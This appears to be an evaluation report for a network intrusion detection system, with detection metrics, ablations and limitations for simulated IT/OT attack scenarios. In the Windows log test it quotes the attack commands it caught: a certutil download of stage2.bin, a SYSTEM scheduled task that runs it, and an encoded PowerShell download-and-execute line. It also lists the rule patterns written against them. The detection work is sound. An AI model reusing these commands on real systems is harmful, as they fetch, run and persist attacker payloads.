# SentinelX Evaluation Scorecard & Performance Audit (Phase 7.3)
**Generated**: 2026-11-09 01:43:58 UTC  
**Code Commit SHA**: `8622ffec13f65069d7da33367963854240eb20ca` *(clean)*  
**Evaluation Scope**: Full End-to-End Pipeline (Ingestion -> Normalization -> 5 Detectors -> Kill-Chain Correlator -> Budget Gating at 0.50).  
**Test Corpus**: 8 Enterprise IT / OT (ICS/SCADA) Hybrid Captures (5 Benign Days, 3 Multi-Stage Attack Scenarios) + 1 Organizer Windows Enterprise Log Suite (Attack + Benign).

---

## 1. Executive Summary & Headline Metrics

| Metric | Measured Value | Benchmark / Target | Evaluation Mode | Status |
| :--- | :--- | :--- | :--- | :--- |
| **Incident Precision** | **100.0%** (3/3 True Positives) | >= 90.0% | LOO Cross-Validation | **PASS** |
| **Incident Recall** | **100.0%** (3/3 Attack Variants) | 100.0% | LOO Cross-Validation | **PASS** |
| **F1 Score** | **1.0000** | >= 0.950 | LOO Cross-Validation | **PASS** |
| **Benign False Positive Rate** | **0.000 FP / 24h** (0 FP across 25.0h simulated = 1.042 days; exact 95% UB: 2.876 FP/24h) | 0.000 strict target | LOO Cross-Validation | **PASS** |
| **Score Separation Margin** | **0.8500** (Min Attack: 1.0000 - Max LOO Benign: 0.1500) | > 0.400 | LOO Empirical Margin | **PASS** |
| **Golden Scenario Step Recall**| **7/7 (100.0%)** across all 3 attack variants | 7/7 steps | In-Sample Replay | **PASS** |
| **Mean Event-Time TTFMA (From First Signal)** | **1.69s** (baseline: 1.54s, reordered: 0.94s, slow_burn: 2.58s) | < 5.0s | In-Sample Replay | **PASS** |
| **Mean Event-Time TTFMA (From Attack Start)**  | **1.69s** (baseline: 1.54s, reordered: 0.94s, slow_burn: 2.58s) | < 5.0s | In-Sample Replay | **PASS** |
| **Classification Accuracy** | **100.0%** (8/8 captures correctly gated) | 100.0% | In-Sample Replay | **PASS** |

> **Headline FP/24h Code Path**: Derived strictly from Leave-One-Out (LOO) cross-validation folds in `eval/metrics.py:compute_metrics_report` (`fp = sum(1 for scores in loo_benign_scores.values() if any(s >= 0.50 for s in scores))`), normalized by total benign simulated hours: `fp / (25.0h / 24) = 0.000 FP / 24h` with an exact one-sided 95% Poisson upper confidence limit of `chi2.ppf(0.95, 2*(k+1))/2 / (25.0h / 24) = 2.876 FP / 24h`. It does NOT rely on in-sample training memorization.

---

## 2. Detector Layer Ablation Study (Tasks 2 & 3)

Each configuration tier was evaluated through the entire correlation and scoring pipeline at budget threshold 0.50.

| Detector Configuration | day_101 (In-Sample) | day_102 (In-Sample) | day_103 (In-Sample) | day_104 (In-Sample) | day_105 (In-Sample) | demo_baseline (Unrounded, Steps) | reordered (Unrounded, Steps) | slow_burn (Unrounded, Steps) | Chain Coverage | Benign FP/24h (In-Sample) |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **1. Rules Only** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.0000, 4/7) | 1 (1.0000, 4/7) | 1 (1.0000, 4/7) | **4/7 steps** | **0.000** |
| **2. Rules + Base + Anom** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.0000, 6/7) | 1 (1.0000, 6/7) | 1 (1.0000, 6/7) | **6/7 steps** | **0.000** |
| **3. Rules + Base + Anom + Graph** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.0000, 6/7) | 1 (1.0000, 6/7) | 1 (1.0000, 6/7) | **6/7 steps** | **0.000** |
| **4. Full (+ Deception)** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.0000, 7/7) | 1 (1.0000, 7/7) | 1 (1.0000, 7/7) | **7/7 steps** | **0.000** |

### Task 2: Unrounded Scores & Score Ceiling Saturation Audit:
- **Measured Rules-Only Unrounded Score**: `1.0000` across `demo_baseline`, `reordered`, and `slow_burn`.
- **Kill-Chain Stages Covered**: `initial_access, credential_access, ot_impact`.
- **Stage & Weight Ceiling Mechanism**:
  - `initial_access` base weight: `0.20`
  - `credential_access` base weight: `0.25`
  - `ot_impact` base weight: `0.30`
  - Base sum: `0.20 + 0.25 + 0.30 = 0.75`.
  - Progression multiplier for 3 unique stages: `1.0 + 0.25 * (3 - 1) = 1.50x`.
  - Intermediate raw score: `0.75 * 1.50 = 1.1250` (already exceeds the 1.0000 ceiling).
  - Session-tainted OT boost: `+0.35` -> raw composite score `1.4750`, clamped to `1.0000`.
- **Finding on Ablation Incident-Level Score Informational Content**:
  Because any combination covering 3 primary attack stages generates a mathematical score >= 1.1250, the incident score saturates at `1.0000` across **all four configurations**. Therefore, the incident score column is **uninformative** for discriminating detector configuration depth. The **scenario step recall column (4/7 vs 6/7 vs 6/7 vs 7/7)** is the sole informative metric distinguishing detection pipeline efficacy.

### Task 3: Honest Ablation Narrative & Single-Detector Dependencies:
1. **Graph Layer Contribution**: The Interaction Graph detector adds **exactly 0 net scenario steps** over Config 2 (6/7 -> 6/7). While graph analysis detects pre-authentication discovery probes and topological pivot edges, it does not uncover previously missed attack actions in this scenario suite.
2. **Step 6 Exclusively Dependent on Rules**: Only `RULE-OT-001` detects Modbus valve manipulation. Dropping `rule` loses Step 6 across all three scenario variants.
3. **Step 2 Exclusively Dependent on Anomaly in `slow_burn`**: In the `slow_burn` scenario, the low-and-slow subnet probe is detected **only** by the Isolation Forest (`anomaly`); dropping `anomaly` causes Step 2 to be completely lost.
4. **Step 4 Exclusively Dependent on Deception**: Decoy honeypot interaction is detected exclusively by `RULE-DECOY-001` / `deception`; dropping `deception` drops Step 4 across all variants.

---

## 3. Incident-Level Precision, Recall, and Confusion Matrix (Tasks 4 & 9)

Evaluated under **Leave-One-Out (LOO) Cross-Validation** across the 5 benign daily folds:
- Each held-out benign fold was evaluated against models trained strictly on the other 4 benign days (preventing memorization).
- True Positives require an active correlated incident reaching score >= 0.50 with multi-stage kill-chain progression.

### Incident Confusion Matrix (Operating Threshold = 0.50):
| | Actual Attack (Positive) | Actual Benign (Negative) | Total Predicted |
| :--- | :---: | :---: | :---: |
| **Predicted Attack** | **TP = 3** | **FP = 0** | **3** |
| **Predicted Benign** | **FN = 0** | **TN = 5** | **5** |
| **Total Actuals** | **3** | **5** | **8 Folds** |

### Leave-One-Out (LOO) Benign Fold Breakdown (Model Isolation Audit):
| Held-Out Benign Day | Training Corpus | LOO Signals Emitted | LOO Incident Count | Max LOO Incident Score | Active Incidents (Th >= 0.50) | Status |
| :--- | :--- | :---: | :---: | :---: | :---: | :--- |
| **day_101** | days 102, 103, 104, 105 | 0 sigs | 0 incs | 0.0000 | 0 | **PASS (0 FP)** |
| **day_102** | days 101, 103, 104, 105 | 0 sigs | 0 incs | 0.0000 | 0 | **PASS (0 FP)** |
| **day_103** | days 101, 102, 104, 105 | 5 sigs (Isolation Forest) | 1 inc | 0.1500 | 0 | **PASS (0 FP, Gated)** |
| **day_104** | days 101, 102, 103, 105 | 0 sigs | 0 incs | 0.0000 | 0 | **PASS (0 FP)** |
| **day_105** | days 101, 102, 103, 104 | 0 sigs | 0 incs | 0.0000 | 0 | **PASS (0 FP)** |
| **Ensemble Total** | — | **5 sigs** | **1 inc** | **0.1500 max** | **0 FPs** | **0.000 FP / 24h** |

### Threshold Operating Curve & Sensitivity Analysis:
| Threshold | TP | FP | FN | TN | Precision | Recall | F1 Score | Operational Classification (Computed Margins) |
| :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :--- |
| 0.10 | 3 | 1 | 0 | 4 | 75.0% | 100.0% | 0.857 | Sub-optimal: 1 benign FP(s) (threshold <= max LOO benign score 0.15) |
| 0.20 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.05 above benign, +0.80 below attack) |
| 0.30 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.15 above benign, +0.70 below attack) |
| 0.40 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.25 above benign, +0.60 below attack) |
| 0.50 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Recommended (Zero FP, 100% Recall; margin: +0.35 above benign, +0.50 below attack) **[RECOMMENDED]** |
| 0.60 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.45 above benign, +0.40 below attack) |
| 0.70 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.55 above benign, +0.30 below attack) |
| 0.80 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.65 above benign, +0.20 below attack) |
| 0.90 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.75 above benign, +0.10 below attack) |

---

## 4. Golden Attack Step Coverage & TTFMA Summary (In-Sample Replay)

| Scenario Step | demo_baseline (Standard) | reordered (Early OT) | slow_burn (Low & Slow) |
| :--- | :--- | :--- | :--- |
| **Step 1: Initial Access (svc_backup)** | baseline, rule (36 sigs) | baseline, rule (36 sigs) | baseline, rule (36 sigs) |
| **Step 2: IT Subnet Discovery Scan** | anomaly, deception, graph (33 sigs) | anomaly, deception, graph (33 sigs) | anomaly (89 sigs) |
| **Step 3: Credential Theft (.db_creds)** | baseline, rule (2 sigs) | baseline, rule (2 sigs) | baseline, rule (2 sigs) |
| **Step 4: Decoy Pivot (cowrie/opencanary)** | deception (17 sigs) | deception (17 sigs) | deception (13 sigs) |
| **Step 5: Lateral Movement to eng-ws** | baseline, deception, graph, rule (47 sigs) | baseline, deception, graph, rule (47 sigs) | baseline, graph, rule (42 sigs) |
| **Step 6: Modbus Valve Manipulation** | rule (3 sigs) | rule (3 sigs) | rule (5 sigs) |
| **Step 7: Decoy PLC Reconnaissance** | baseline, deception, graph (17 sigs) | baseline, deception, graph (17 sigs) | baseline, deception, graph (15 sigs) |
| **Total Steps Represented** | **7 / 7 (100.0%)** | **7 / 7 (100.0%)** | **7 / 7 (100.0%)** |
| **Incident Score** | **1.00 (CRITICAL)** | **1.00 (CRITICAL)** | **1.00 (CRITICAL)** |
| **Event-Time TTFMA (from first signal)** | **1.54s** (RULE-AUTH-001) | **0.94s** (RULE-AUTH-001) | **2.58s** (RULE-AUTH-001) |
| **Event-Time TTFMA (from attack start)**  | **1.54s** (src: 10.10.1.5) | **0.94s** (src: 10.10.1.5) | **2.58s** (src: 10.10.1.5) |

---

## 5. Detector Contribution & Real Ranking Matrix (Task 1)

Ranked strictly by measured impact: **1) Scenario Steps Lost when Dropped Alone**, then **2) Incident Score Delta**. Detectors tying on both metrics are shown as TIED rather than broken by signal count.

| Rank | Detector Engine | Steps Lost when Dropped | Critical Step Enabler | Score Delta | TP Signals | LOO Noise Delta | Derived Trust Classification |
| :---: | :--- | :---: | :--- | :---: | :---: | :--- | :--- |
| **#1 (Tied)** | **Context-Aware Rules Engine** | **3 steps** | Step 6 | 0.0000 | 77 sigs | 0 LOO signals delta | Essential Anchor (3 steps lost when dropped; 0 LOO FPs) |
| **#1 (Tied)** | **Deception Engine (Honeypot/Honeytoken)** | **3 steps** | Step 4 | 0.0000 | 47 sigs | 0 LOO signals delta | Essential Anchor (3 steps lost when dropped; 0 LOO FPs) |
| **#3** | **Isolation Forest Anomaly Detector** | **1 steps** | Step 2 | 0.0000 | 147 sigs | -5 IF signals on day_103 (-0.15 max score) | Scenario Enabler (1 step(s) lost when dropped; LOO noise gated at 0.50) |
| **#4 (Tied)** | **Behavioral Baseline Engine** | **0 steps** | None (redundant step coverage) | 0.0000 | 57 sigs | 0 LOO signals delta | Supporting Entity Context (0 steps lost when dropped; 0 LOO FPs) |
| **#4 (Tied)** | **Interaction Graph Detector** | **0 steps** | None (redundant step coverage) | 0.0000 | 43 sigs | 0 LOO signals delta | Redundant Topology Context (0 steps lost when dropped; 0 LOO FPs) |

---

## 6. Organizer-Log Robustness Test & Context Boundaries (Task 5)

Simulated third-party enterprise audit using `content/mappings/windows_security.yaml` against Windows EVTX telemetry on host `WIN-CORP-DC01`:

- **Events Ingested**: 12 normalized Windows events (logon success 4624 type 3/10, logon failure 4625, PowerShell -EncodedCommand, certutil download cradle, schtasks persistence, wmic execution, net user).
- **Signals Generated**: 20 signals across 3 engines (baseline, graph, rule).
- **Correlated Incident**: Formed 1 active incident reaching score **0.5625 (MEDIUM)**.
- **MITRE ATT&CK Techniques Identified**: `T1021, T1059, T1078.003` (Generic Windows techniques `T1021`, `T1059`, `T1078.003`; zero Unix/SSH sub-technique collisions).

### What Was Detected (Generic Transferability):
- RULE-SHELL-001: Caught 5 Windows execution commands via process inspection (e.g. certutil.exe -urlcache -split -f http://192.168.100.45:8000/stage2.bin C:\Windows\Temp\stage2.exe; schtasks /create /tn "SecurityHealthUpdate" /tr "C:\Windows\Temp\stage2.exe" /sc onlogon /ru SYSTEM; wmic process call create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgA0ADUAOgA4ADAAMAAwAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==").
- BASE-DEV-001: Unsupervised behavioral baseline deviation flagged 12 events for unobserved user account(s): Administrator, backdoor, svc_payroll.
- GRAPH-EDGE-001: Interaction graph recognized 3 unprecedented topology and execution relationships on unmapped enterprise host.
- Correlation Pipeline: Correlated 20 heterogeneous signals into top incident score 0.5625 (MEDIUM).

### What Was NOT Detected (Environment Boundary Analysis):
- RULE-CRED-001 (Credential Access): Did NOT fire because telemetry did not observe read access to lab credential stores (/srv/share/.db_creds).
- RULE-NET-001 (Cross-Zone Pivot): Did NOT fire because unmapped foreign host lacks network zone classification in assets inventory.
- RULE-DECOY-001 (Decoy Touch): Did NOT fire because adversary did not interact with registered deception assets or honeytokens (domain=decoy=False).
- RULE-AUTH-001 (Unexpected Zone Login): Did NOT fire because target host(s) (WIN-CORP-DC01) are not registered in content/assets.yaml (zone boundary resolution miss).
- RULE-OT-001 (Unauthorized OT Write): Did NOT fire because enterprise Windows telemetry contains no Modbus ICS protocol fields (ot.* is null across all 12 events; has_ot_fields=False).

### Benign Windows Fixture Evaluation on Unfamiliar Telemetry:
- **Benign Events Ingested**: 14 (standard administrative and background task activity).
- **Benign Signals Emitted**: 17 (baseline, graph).
- **Benign Incidents Formed**: 1 (Score: 0.4000).
- **Unfamiliar Telemetry Analysis**: On unfamiliar telemetry from an un-baselined host (WIN-CORP-DC01), unsupervised baseline and graph detectors emitted 17 signals across 2 detector(s) (baseline, graph), forming 1 incident (score 0.4000). Because WIN-CORP-DC01 was not in the benign training corpus, novelty detection flags normal admin activity as unobserved user/host pairings. Under the corroboration requirement (novelty_only=true), the incident score is capped at 0.4000, preventing a false positive alert at the 0.50 budget threshold.

### Architectural Takeaway:
Detecting Windows execution required rule-content extension in content/rules/encoded_or_suspicious_shell.yaml (-EncodedCommand, certutil -urlcache, wmic process call create, schtasks /create, Invoke-WebRequest) and updating MITRE technique mappings to parent T1059/T1021. Unsupervised baseline and graph detectors transferred across operating systems without rule modifications, but required a corroboration requirement (novelty_only <= 0.40) to prevent unfamiliar host false positives at the 0.50 operating threshold. Deep context-aware authorization rules (RULE-AUTH-001, RULE-OT-001) strictly require asset inventory registration to establish valid operational boundaries.

---

## 7. Operational Limitations & Threat Model Boundaries (Task 6)

1. **In-Distribution Evaluation**:
   The evaluation corpus consists of 3 attack scenario variants (`demo_baseline`, `reordered`, `slow_burn`) that share 7 underlying action primitives (SSH access, discovery scan, credential dumping, decoy pivots, lateral hop, Modbus manipulation, PLC recon). The detection rules and graph models were authored alongside these scenarios within the same virtualized lab environment. Performance against novel, unobserved adversarial tactics outside this sequence will depend on generic living-off-the-land heuristics and baseline deviations rather than deterministic rule landmarks.

2. **Event-Time TTFMA Scope, Timestamp Provenance & Replay Limitations**:
   Time to First Meaningful Alert (TTFMA) reported here is strictly an **event-time TTFMA** ($t_{\text{threshold\_cross}} - t_{\text{first\_adversary\_event}}$), measuring elapsed event timestamps between normalized events in the capture, **NOT** software pipeline processing latency. Processing latency not measured in replay; measured live in the demo rehearsal (Phase 8).

   Detailed timestamp provenance analysis of event (a) (first `src: 10.10.1.5` event) vs event (c) (first `RULE-AUTH-001` evidence) explains the measured 0.94s / 1.54s / 2.58s metrics:
   - **Event (a)** (`action: exec` from `cmd.jsonl` forwarded to Wazuh): `event.ts` is set from `inner.get("ts")` at `engine/sentinelx/ingest/adapters/wazuh.py:256`, which has 1-second resolution without sub-second precision (`demo_baseline`: `2026-11-08T04:22:44Z`). In contrast, its raw Wazuh archive entry (`archives.json` offset 1182075) was written at `04:22:45.550`.
   - **Event (c)** (`action: ssh_login` from `sshd` auth log forwarded to Wazuh): `event.ts` is set from `record.get("timestamp")` at `engine/sentinelx/ingest/adapters/wazuh.py:139`, which has millisecond precision (`demo_baseline`: `2026-11-08T04:22:45.544000+00:00`).
   - **Provenance Finding**: In raw Wazuh archive chronology, the SSH authentication event (c) occurred at `45.544`, and the resulting bash command execution (a) was archived at `45.550` (6 milliseconds later). The 0.94s / 1.54s / 2.58s delta is therefore a **timestamp-source difference** between the integer-second process auditing log and the millisecond-stamped sshd auth log, rather than sequential detection latency.
   Both event-time baselines ("from first signal" and "from attack start") produce identical durations because the adversary's first action immediately emits the incident's first graph signal at $T_0$, making $T_{\text{first\_signal}} = T_{\text{attack\_start}}$. However, TTFMA strictly evaluates initial ingress detection; it does not measure detection latency for subsequent lateral hops or OT manipulation phases occurring minutes later.

3. **Benign Corpus Diversity & Volume**:
   The benign validation corpus consists of N=5 simulated diurnal days (`day_101` through `day_105`) synthesized from a single traffic generator (`lab/benign/benign_loop.py`), totaling 25.0h simulated (computed 25.0016h across 1.042 days). While it models diurnal human-like Poisson activity and batch maintenance tasks, it lacks the chaotic diversity, network reconfigurations, software updates, and organizational drift encountered in real multi-tenant production networks.

4. **Isolation Forest Day 103 False Positives Under LOO**:
   Under Leave-One-Out (LOO) cross-validation, the Isolation Forest model trained on days 101, 102, 104, and 105 emits 5 unsupervised volumetric anomaly signals (`ANOM-IF-001`) during day 103, resulting in an incident score of `0.1500`. While the calibrated budget threshold (`0.50`) successfully suppresses this incident (yielding zero headline false positives), operating at thresholds below `0.20` causes day 103 to register as a false positive.

5. **Remaining Windows False Positive Risk & LOLBIN Boundaries**:
   While tightening rule patterns (`content/rules/encoded_or_suspicious_shell.yaml`) to specific command-line arguments (`certutil -urlcache`, `schtasks /create`, `wmic process call create`, `-EncodedCommand`, `-enc `) successfully eliminated all 3 false positive alerts on legitimate admin activity (`schtasks /query`, `wmic os get caption`, `certutil -hashfile`) across the 14-event Windows benign control fixture, residual false-positive risk remains. Legitimate automated administrative tooling, deployment agents (e.g. SCCM, Ansible), or scheduled maintenance scripts that legitimately create scheduled tasks or invoke `certutil` with caching flags could still trigger `RULE-SHELL-001` if deployed without enterprise allowlisting. Furthermore, novelty detectors (graph, baseline) will treat any newly seen Windows admin workstation or logon session as anomalous until adequate baselining is established.

6. **Novelty Corroboration Requirement Trade-Off**:
   Under the corroboration requirement, an incident supported solely by novelty signals (`baseline`, `graph`, `anomaly`) without corroboration from a deterministic rule or deception trap is capped at `score = min(score, novelty_cap)` (default `0.4000`) and flagged `novelty_only=true`.
   - **Protection**: Prevents false alarms on un-baselined hosts in unfamiliar enterprise environments (e.g., unfamiliar Windows telemetry is capped at 0.4000, suppressing a false alarm).
   - **Trade-off**: A pure 'living-off-the-land' or novel zero-day attack that eludes all deterministic rules and deception lures will be intentionally capped below the alert threshold ($\theta = 0.50$) by design.
   - **Configuration & Sensitivity**: The cap is only restrictive below threshold when $\theta > \\text{novelty\\_cap}$. If an analyst lowers the operating threshold $\theta$ to $0.35$ (below $\\text{novelty\\_cap} = 0.40$), novelty-only incidents will alert regardless of the corroboration requirement. The cap value is configured in `engine/sentinelx/config.py` via `IncidentConfig.novelty_cap: float = 0.40`.
